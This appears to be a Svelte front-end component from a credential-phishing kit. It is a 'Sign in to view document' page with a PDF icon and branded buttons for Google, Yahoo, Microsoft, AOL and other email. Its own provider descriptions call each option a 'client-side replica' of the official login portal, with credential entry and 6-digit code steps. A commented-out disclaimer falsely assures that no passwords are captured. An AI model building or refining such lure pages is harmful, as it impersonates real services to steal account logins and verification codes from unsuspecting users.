<script>
  import pdfImg from '$lib/assets/imgs/pdf-icon-img.svg'

  let { onSelectBrand = 'home' | 'google' | 'google2' | 'yahoo' | 'apple' | 'microsoft'  | 'aol' | 'email' } = $props()

  const providers = [
    {
      id: 'google',
      name: 'Continue with Google',
      subtitle: 'Google Account Authentication',
      description: 'Polished client-side replica featuring beautiful floating label animations, password peek, error validation states, and a multi-step slide transition.',
      themeColor: 'hover:border-[#4285F4]/60 hover:shadow-[0_8px_30px_rgba(66,133,244,0.06)]',
      accentBg: 'bg-[#4285F4]/5',
      badge: 'Floating UI',
      badgeColor: 'text-[#1a73e8] bg-[#1a73e8]/10'
    },
    /* {
      id: 'google2',
      name: 'Google Sign-In II',
      subtitle: 'Google Account Authentication',
      description: 'Polished client-side replica featuring beautiful floating label animations, password peek, error validation states, and a multi-step slide transition.',
      themeColor: 'hover:border-[#4285F4]/60 hover:shadow-[0_8px_30px_rgba(66,133,244,0.06)]',
      accentBg: 'bg-[#4285F4]/5',
      badge: 'Floating UI',
      badgeColor: 'text-[#1a73e8] bg-[#1a73e8]/10'
    }, */
    {
      id: 'yahoo',
      name: 'Continue with Yahoo!',
      subtitle: 'Yahoo! Member Directory Auth',
      description: 'Accurate model of the signature deep-purple theme with custom responsive layout cards, custom checkbox styling, step loading, and password toggles.',
      themeColor: 'hover:border-[#6001d2]/60 hover:shadow-[0_8px_30px_rgba(96,1,210,0.06)]',
      accentBg: 'bg-[#6001d2]/5',
      badge: 'Classic Style',
      badgeColor: 'text-[#6001d2] bg-[#6001d2]/10'
    },
    /* {
      id: 'apple',
      name: 'Apple ID Sign-In',
      subtitle: 'iCloud & Apple Account Gateway',
      description: 'Sleek dark-accented responsive interface replicating Apple’s legendary login prompts, round inputs, lightweight layout, and micro-loaders.',
      themeColor: 'hover:border-black hover:shadow-[0_8px_30px_rgba(0,0,0,0.06)]',
      accentBg: 'bg-black/5',
      badge: 'Minimal design',
      badgeColor: 'text-black bg-black/10'
    }, */
    {
      id: 'microsoft',
      name: 'Continue with Microsoft ',
      subtitle: 'Live & Microsoft Services Portal',
      description: 'Beautiful multi-quadrant flat aesthetic representing the official corporate login portal with custom fast lookup verification transitions.',
      themeColor: 'hover:border-[#0067b8]/60 hover:shadow-[0_8px_30px_rgba(0,103,184,0.06)]',
      accentBg: 'bg-[#0067b8]/5',
      badge: 'Corporate UI',
      badgeColor: 'text-[#0067b8] bg-[#0067b8]/10'
    },
    {
      id: 'aol',
      name: 'Continue with AOL',
      subtitle: 'AOL Member Authentication',
      description: 'Polished client-side replica with AOL\'s signature royal-blue accents, wordmark branding, step-by-step credentials entry, and 6-digit verification support.',
      themeColor: 'hover:border-[#3f4dfa]/60 hover:shadow-[0_8px_30px_rgba(63,77,250,0.06)]',
      accentBg: 'bg-[#3f4dfa]/5',
      badge: 'Classic AOL',
      badgeColor: 'text-[#3f4dfa] bg-[#3f4dfa]/10'
    },
    {
      id: 'email',
      name: 'Continue with Other Email',
      subtitle: 'Universal SecureGate Portal',
      description: 'Ultra-modern developer-centric custom SSO layout featuring a security shield logo, floating labels, validation states, and secure 6-digit OTP verification.',
      themeColor: 'hover:border-slate-800 hover:shadow-[0_8px_30px_rgba(15,23,42,0.06)]',
      accentBg: 'bg-slate-50',
      badge: 'Modern Custom',
      badgeColor: 'text-emerald-600 bg-emerald-500/10'
    }
  ];
</script>


<section class="w-full max-w-4xl mx-auto px-6 py-12 md:py-20 animate-fadeIn">
  <!-- Header section -->
  <div class="text-center mb-14">
    <div class="inline-flex items-center gap-2.5 px-3 py-1.5 font-semibold text-[#1a73e8] mb-5 font-mono uppercase tracking-wider">
      <span class="w-12 h-12 inline-block relative">
        <img src={pdfImg} class="absolute w-full min-w-full object-center object-cover"  alt="pdf" width="30" height="auto">
      </span>
      <!-- <span>
        Authentication Hub
      </span> -->
    </div>

    <h2 class="text-3xl md:text-4.5xl tracking-tight leading-none mb-4">
      Sign in to view document
    </h2>

    <p class="text-gray-500 text-base md:text-lg max-w-2xl mx-auto leading-relaxed">
      Verify your identity with your email provider to access this document.
    </p>
  </div>

  <!-- Linear Stack List -->
  <div class="space-y-4 max-w-3xl mx-auto">
    {#each providers as p}
      <button
        onclick={() => onSelectBrand(p.id)}
        class="
          group bg-white rounded-full border border-gray-200/80 p-2 cursor-pointer select-none transition-all duration-300 
          flex items-center gap-6 w-full {p.themeColor}
        "
      >
        <!-- Left section: Icon / Logo -->
        <div 
          class="
            w-6 h-6 rounded-2xl {p.accentBg} shrink-0 flex items-center justify-center transition-all duration-300 group-hover:scale-105 
            self-center justify-self-center sm:translate-x-58
          "
          style="transform: translateX(3rem);"
        >
          {#if p.id === 'google' || p.id === 'google2'}
            <svg viewBox="0 0 24 24" class="w-8 h-8" fill="currentColor">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.85z" fill="#FBBC05" />
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.85c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
            </svg>
          {:else if p.id === 'yahoo'}
            <div class="w-6 h-6 rounded-xl bg-[#6001d2] flex items-center justify-center text-white font-black text-lg">Y!</div>
          {:else if p.id === 'apple'}
            <svg viewBox="0 0 17 20" class="w-7 h-7 text-black fill-current">
              <path d="M15.03 10.62c.03-2.67 2.18-3.95 2.22-3.97-1.24-1.82-3.18-2.07-3.87-2.12-1.65-.17-3.23.97-4.07.97-.83 0-2.14-.95-3.53-.92-1.83.03-3.51 1.07-4.45 2.7-1.9 3.29-.49 8.16 1.36 10.82.9 1.3 1.95 2.75 3.36 2.7 1.36-.05 1.88-.88 3.53-.88 1.63 0 2.12.88 3.54.85 1.45-.03 2.37-1.3 3.26-2.6.99-1.46 1.41-2.88 1.43-2.95-.03-.02-2.76-1.06-2.76-4.22zM12.91 3.24c.73-.89 1.22-2.12 1.08-3.24-.96.04-2.13.64-2.82 1.45-.61.7-1.14 1.95-1 3.05 1.07.08 2.17-.54 2.74-1.26z" />
            </svg>
          {:else if p.id === 'microsoft'}
            <div class="grid grid-cols-2 gap-[2.5px] w-6 h-6">
              <div class="w-2.75 h-2.75 bg-[#f25022]"></div>
              <div class="w-2.75 h-2.75 bg-[#7fba00]"></div>
              <div class="w-2.75 h-2.75 bg-[#00a4ef]"></div>
              <div class="w-2.75 h-2.75 bg-[#ffb900]"></div>
            </div>
          {:else if p.id === 'aol'}
            <span class="font-extrabold text-xl tracking-tighter text-black lowercase select-none">
              aol<span class="text-[#3f4dfa] font-black">.</span>
            </span>
          {:else if p.id === 'email'}
            <svg viewBox="0 0 24 24" class="w-6 h-6 text-slate-700" fill="none" stroke="currentColor" stroke-width="2.5">
              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 01-1.043 3.296 3.745 3.745 0 01-3.296 1.043A3.745 3.745 0 0112 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 01-3.296-1.043 3.745 3.745 0 01-1.043-3.296A3.745 3.745 0 013 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 011.043-3.296 3.746 3.746 0 013.296-1.043A3.746 3.746 0 0112 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 013.296 1.043 3.746 3.746 0 011.043 3.296A3.745 3.745 0 0121 12z" />
            </svg>
          {/if}
        </div>

        <!-- Middle Section: Text description -->
        <div class="flex-1 sm:text-left self-center">
          <div class="flex gap-2 mb-1 justify-center">
            <h3 class="text-sm not-sm:text-[16px] text-gray-500 font-normal group-hover:text-gray-950 transition-colors">
              {p.name}
            </h3>
            <!-- <span class="text-[9px] uppercase font-mono tracking-wider font-extrabold px-2 py-0.5 rounded-full inline-block self-center sm:self-auto {p.badgeColor}">
              {p.badge}
            </span> -->
          </div>
          <!-- <p class="text-xs font-semibold text-gray-400 mb-2 uppercase tracking-wide">
            {p.subtitle}
          </p> -->
          <!-- <p class="text-sm text-gray-500/90 leading-relaxed font-normal">
            {p.description}
          </p> -->
        </div>

        <!-- Right section: Forward Arrow button -->

        <!-- <div class="flex items-center justify-center bg-gray-50/50 group-hover:bg-gray-100/80 rounded-xl px-4 py-2.5 sm:py-0 transition-all duration-300 self-stretch shrink-0">
          <div class="flex items-center gap-1.5 text-xs font-bold text-gray-600 group-hover:text-gray-950">
            <span class="sm:hidden hidden">Explore Svelte Flow</span>
            <svg class="w-4 h-4 transform transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </div>
        </div> -->
      </button>
    {/each}
  </div>

  <!-- <div class="mt-16 p-6 bg-gray-50 border border-gray-200/60 rounded-2xl text-center max-w-2xl mx-auto">
    <p class="text-xs text-gray-400 font-medium leading-relaxed">
      🔒 <span class="font-semibold text-gray-500">Security Disclaimer:</span> Under no condition are usernames or passwords logged or 
      captured. All information are processed and managed by these providers.
    </p>
  </div> -->
</section>